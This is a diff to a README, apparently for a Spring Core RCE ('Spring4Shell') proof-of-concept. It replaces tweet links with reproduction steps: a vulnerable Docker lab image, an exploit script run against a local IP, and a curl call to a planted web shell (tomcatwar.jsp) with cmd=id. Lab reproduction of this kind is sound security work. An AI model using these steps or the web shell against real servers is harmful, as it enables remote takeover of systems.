@@ -1,13 +1,9 @@
-UPDATE: Praetorian Labs claims they've verified the bug.
-"Spring Core on JDK9+ is vulnerable to remote code execution due to a bypass for CVE-2010-1622."
+# How to reproduce
+docker run -d -p 8082:8080 --name springrce -it vulfocus/spring-core-rce-2022-03-29
 
-https://twitter.com/praetorianlabs/status/1509207085485113356
+python3 ./exp.py --url http://192.168.0.11:8082
 
-https://twitter.com/praetorianlabs/status/1509207144675086343
-
-Confirmation from GitHub security researcher:
-
-https://twitter.com/pwntester/status/1509235919106236416
+curl --output - "http://192.168.0.11:8082/tomcatwar.jsp?pwd=j&cmd=id"
 
 
 # Spring Core RCE
